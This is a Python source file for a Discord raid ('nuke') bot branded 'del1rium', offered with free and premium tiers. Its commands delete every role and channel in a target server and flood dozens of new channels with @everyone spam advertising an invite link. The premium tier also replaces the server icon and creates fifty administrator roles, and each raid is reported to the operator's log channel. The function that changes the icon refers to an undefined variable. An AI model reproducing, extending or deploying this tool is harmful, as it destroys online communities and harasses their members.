import discord
from discord.ext import commands
import asyncio
import os
import aiohttp
from datetime import datetime
from dotenv import load_dotenv

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ MAIN CONFIGURATION / CONFIGURACION PRINCIPAL ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

CENTRAL_SERVER_ID = 1453920087194206394
PREMIUM_ROLE_ID = 1458177413325259035
OWNER_ID = 1450919094202269881
LOG_CHANNEL_ID = 1458257075393003561

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ RAID CONFIGURATION / CONFIGURACION DE RAID ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NORMAL_NUKE_CHANNEL_NAME = "raid-by-del1rium"
NORMAL_NUKE_TEXT = "@everyone raid by [𝔡𝔢𝔩1𝔯𝔦𝔲𝔪 ℭ𝔬.](https://discord.gg/cJJJWHfnn2)"
PREMIUM_CHANNEL_NAME = "premium-raid"
PREMIUM_SPAM_TEXT = "@everyone premium raid by del1rium https://discord.gg/cJJJWHfnn2 https://sheer-blush-bqrrem0s4b.edgeone.app/1767987541955.jpg.png"
RAID_ICON_URL = "https://sheer-blush-bqrrem0s4b.edgeone.app/1767987541955.jpg.png"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ INITIALIZATION / INICIALIZACION ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=':', intents=intents, help_command=None)

def is_premium():
    async def predicate(ctx):
        if ctx.author.id == OWNER_ID: return True
        central_server = bot.get_guild(CENTRAL_SERVER_ID)
        if not central_server: return False
        member = central_server.get_member(ctx.author.id)
        if not member or not any(role.id == PREMIUM_ROLE_ID for role in member.roles):
            try: 
                embed = discord.Embed(
                    title="RESTRICTED ACCESS / ACCESO RESTRINGIDO",
                    description="This feature is for Premium users only.\nEsta funcion es solo para usuarios Premium.",
                    color=0x2b2d31
                )
                await ctx.send(embed=embed, delete_after=10)
            except discord.Forbidden: pass
            return False
        return True
    return commands.check(predicate)

@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    DEL1RIUM SYSTEM - STATUS: ONLINE / EN LINEA
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    User / Usuario: {bot.user.name}
    Owner ID / ID Dueno: {OWNER_ID}
    Logs: Active / Activos
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ COMMAND MODULES / MODULO DE COMANDOS ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.command(name='help')
async def custom_help(ctx):
    if ctx.channel.id == LOG_CHANNEL_ID: return
    
    if ctx.guild.id == CENTRAL_SERVER_ID:
        embed = discord.Embed(
            title="PROTECTED SERVER / SERVIDOR PROTEGIDO",
            description="Attack functions are disabled here.\nLas funciones de ataque estan desactivadas.",
            color=0x2b2d31
        )
        await ctx.send(embed=embed, delete_after=15)
        return

    await ctx.message.delete()
    embed = discord.Embed(
        title="OPERATION MENU / MENU DE OPERACIONES",
        description="Available commands for execution.\nComandos disponibles para ejecucion.",
        color=0x2b2d31
    )
    
    embed.add_field(
        name="PUBLIC COMMANDS / COMANDOS PUBLICOS",
        value="> `:nuke` \nStandard raid (25 channels).\nRaid estandar (25 canales).",
        inline=False
    )
    
    embed.add_field(
        name="PREMIUM COMMANDS / COMANDOS PREMIUM",
        value="> `:premiumnuke` \nMassive raid (50 channels + roles).\nRaid masivo (50 canales + roles).\n\n> `:nukeconfig <name>, <text>` \nConfigure premium payload.\nConfigurar parametros premium.",
        inline=False
    )
    
    embed.set_footer(text="Del1rium Co. | Global Operations Management")
    help_message = await ctx.send(embed=embed)
    await asyncio.sleep(60)
    await help_message.delete()

@bot.command(name='nuke')
async def nuke_normal(ctx):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not ctx.guild.me.guild_permissions.administrator: return
    await execute_nuke(ctx, NORMAL_NUKE_CHANNEL_NAME, NORMAL_NUKE_TEXT, 25, 500, is_premium=False)

@bot.command(name='premiumnuke')
@is_premium()
async def premium_nuke(ctx):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not ctx.guild.me.guild_permissions.administrator: return
    await execute_nuke(ctx, PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT, 50, 1000, is_premium=True)

@bot.command(name='nukeconfig')
@is_premium()
async def nuke_config(ctx, *, args: str = None):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not args or "," not in args:
        embed = discord.Embed(
            title="SYNTAX ERROR / ERROR DE SINTAXIS",
            description="Usage / Uso: :nukeconfig name, text",
            color=0x2b2d31
        )
        await ctx.send(embed=embed, delete_after=10)
        return

    channel_name, spam_text = [x.strip() for x in args.split(",", 1)]
    
    if not channel_name or not spam_text:
        return

    global PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT
    PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT = channel_name, spam_text
    
    try: await ctx.message.delete()
    except: pass

    embed = discord.Embed(
        title="CONFIGURATION UPDATED / CONFIGURACION ACTUALIZADA",
        color=0x2b2d31
    )
    embed.add_field(name="Channels / Canales", value=f"`{channel_name}`", inline=True)
    embed.add_field(name="Text / Texto", value=f"```{spam_text}```", inline=False)
    
    confirmation_msg = await ctx.send(embed=embed)
    await asyncio.sleep(15)
    try: await confirmation_msg.delete()
    except: pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ EXECUTION ENGINE / MOTOR DE EJECUCION ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def execute_nuke(ctx, channel_name, spam_text, num_channels, total_pings, is_premium: bool):
    guild = ctx.guild
    original_member_count = guild.member_count
    raid_type = "PREMIUM" if is_premium else "STANDARD / ESTANDAR"
    
    print(f"INITIATING RAID {raid_type} IN: {guild.name}")
    
    pings_per_channel = total_pings // num_channels if num_channels > 0 else 0
    remaining_pings = total_pings % num_channels if num_channels > 0 else 0
    
    destruction_tasks = [
        *(role.delete() for role in guild.roles if not role.is_default() and not role.managed),
        *(channel.delete() for channel in guild.channels)
    ]
    
    if is_premium:
        destruction_tasks.append(execute_premium_actions(guild))
        
    await asyncio.gather(*destruction_tasks, return_exceptions=True)
    
    spam_tasks = []
    for i in range(num_channels):
        extra_ping = 1 if i < remaining_pings else 0
        spam_tasks.append(create_and_spam(guild, channel_name, spam_text, i, pings_per_channel + extra_ping))
    
    await asyncio.gather(*spam_tasks)
    
    print(f"RAID COMPLETED IN: {guild.name}")
    await send_log_embed(ctx, raid_type, original_member_count, num_channels, total_pings)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ LOGGING SYSTEM / SISTEMA DE REGISTROS ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def send_log_embed(ctx, raid_type, member_count, channels, total_pings):
    log_channel = bot.get_channel(LOG_CHANNEL_ID)
    if not log_channel: return
    
    embed = discord.Embed(
        title="OPERATION REPORT / REPORTE DE OPERACION",
        color=0x2b2d31,
        timestamp=datetime.utcnow()
    )
    
    embed.add_field(name="Server / Servidor", value=f"**{ctx.guild.name}**\n`({ctx.guild.id})`", inline=True)
    embed.add_field(name="Author / Autor", value=f"{ctx.author.mention}", inline=True)
    embed.add_field(name="Type / Tipo", value=f"`{raid_type}`", inline=True)
    
    stats = (
        f"```\n"
        f"Members / Miembros: {member_count}\n"
        f"Channels / Canales: {channels}\n"
        f"Pings / Pings:     {total_pings}\n"
        f"```"
    )
    embed.add_field(name="Statistics / Estadisticas", value=stats, inline=False)
    
    if ctx.guild.icon:
        embed.set_thumbnail(url=ctx.guild.icon.url)
        
    embed.set_footer(text="Operation Finished / Operacion Finalizada")
    
    try: await log_channel.send(embed=embed)
    except discord.Forbidden: pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ UTILITY FUNCTIONS / FUNCIONES DE APOYO ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def create_and_spam(guild, channel_name, spam_text, index, num_pings):
    try:
        channel = await guild.create_text_channel(f'{channel_name}-{index+1}')
        await spam_pings(channel, spam_text, num_pings)
    except Exception: pass

async def spam_pings(channel, spam_text, amount):
    sent_count = 0
    consecutive_fails = 0
    
    while sent_count < amount:
        try:
            await channel.send(spam_text)
            sent_count += 1
            consecutive_fails = 0
            await asyncio.sleep(0.1)
        except discord.Forbidden:
            break
        except Exception:
            consecutive_fails += 1
            if consecutive_fails >= 5:
                await asyncio.sleep(2.0)
                consecutive_fails = 0
            if consecutive_fails > 20:
                break

async def execute_premium_actions(guild):
    tasks = [change_server_icon(guild), create_chaotic_roles(guild)]
    await asyncio.gather(*tasks, return_exceptions=True)

async def change_server_icon(guild):
    try:
        async with aiohttp.ClientSession() as session, session.get(URL_ICONO_RAID) as resp:
            if resp.status == 200: await guild.edit(icon=await resp.read())
    except Exception: pass

async def create_chaotic_roles(guild):
    tasks = [
        guild.create_role(
            name=f"hacked-by-del1rium-{i}", 
            permissions=discord.Permissions(administrator=True)
        ) for i in range(50)
    ]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.event
async def on_command_error(ctx, error):
    pass

if __name__ == "__main__":
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("ERROR: TOKEN NOT CONFIGURED / TOKEN NO CONFIGURADO")
